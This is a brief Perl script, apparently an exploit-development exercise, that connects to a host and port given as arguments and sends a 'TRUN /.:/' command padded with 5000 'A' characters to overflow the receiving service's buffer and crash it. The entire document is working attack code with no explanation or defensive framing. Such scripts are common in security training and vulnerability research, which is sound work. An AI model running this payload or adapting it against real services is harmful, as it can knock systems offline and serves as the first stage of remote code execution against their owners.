#!/usr/bin/perl
use IO::Socket;

if ($ARGV[1] eq '') {
        die("Usage: $0 IP_ADDRESS PORT\n\n");
}

$baddata = "TRUN /.:/";
$baddata .= "A" x 5000;

$socket = IO::Socket::INET->new(
        Proto    => "tcp",
        PeerAddr => "$ARGV[0]",
        PeerPort => "$ARGV[1]"
) or die "Cannot connect to $ARGV[0]:$ARGV[1]";

$socket->recv($serverdata, 1024);
print "$serverdata";

$socket->send($baddata);
